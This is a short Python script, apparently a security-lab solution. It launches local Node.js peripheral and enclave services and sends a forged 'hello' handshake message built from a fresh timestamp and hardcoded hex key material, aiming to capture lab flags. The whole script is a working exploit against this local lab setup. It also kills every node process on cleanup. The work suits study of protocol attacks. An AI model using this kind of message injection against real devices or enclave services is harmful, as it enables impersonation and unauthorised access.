#from cryptodome import *
import os
import subprocess
import signal
from time import sleep
import code
import select
import time
import requests
from requests.exceptions import ConnectionError

path = "/home/isl/t2/"
node_prefix = ""
#path = "/mnt/hgfs/VMwareMain/ETH/Lab/Module4/Task2/"
#node_prefix = "/home/toroto006/Downloads/node-v16.13.0-linux-x64/bin/"

enclave_uri = "http://127.0.0.1:37100"
peripheral_uri = "http://127.0.0.1:37200"

def cleanUp():
    os.system("pkill -9 node")

def setup() -> subprocess.Popen:
    #  Ensure that you start M, P and SP before starting RP to guarantee correct operation
    P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE)
    sleep(1)
    E = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}enclave"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE)
    sleep(2)
    print("Setup done, let's now do the request")
    return P, E

def readuntil(w, s, name):
    line = ""
    while s not in line:
        line = w.stdout.readline().decode().rstrip()
        print(f"{name}<{line}")
    return s

def injectHello(P):
    # flag2-3
    readuntil(P, "Store takes some time", "PwaitS")
    # 1636560351705$00
    ts = str(int(time.time()*1000))+"$00"
    assert len(ts) == 16
    msg = f'hello$0000000000{ts}0389289a839f8104a19535a57c60be21c2da9312df51308e0cd363ba82885b51111111111111111111111111111111112880ccda64f655478e053e178a2b4caf3441570c37c51e5eddeb4fd3f5a15d94653de7101e9c59229b666124029fc7d2dbf080223cc1e27635e9ea1f374e44bf86208d23fe97661d97ed63d5b1585afed679e7d2855f55d403e71c50ebe0390207d926be16293d3d2aa55e6ea6d9f013'
    assert len(msg) == 352
    headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
    try:
        rep = requests.post(f"{peripheral_uri}/hello", data=msg, headers=headers)
        if rep.status_code == 200:
            print(f"P req returned {rep.text}")
        else:
            print(f"P got {rep}")
    except ConnectionError:
        print("ERROR: An error occurred")

def main():
    P, E = setup()
    # Exploit
    injectHello(P)
    #readuntil(E, "Enclave connected", "E")

if __name__ == "__main__":
    cleanUp()
    try:
        main()
    except Exception as e:
        print(e)
        print(f"An error occured in main!")
    finally:
        cleanUp()
    #os.system("cd /home/isl/t2 && /home/isl/t2/run.sh")
    print("Exploit done")
    exit()
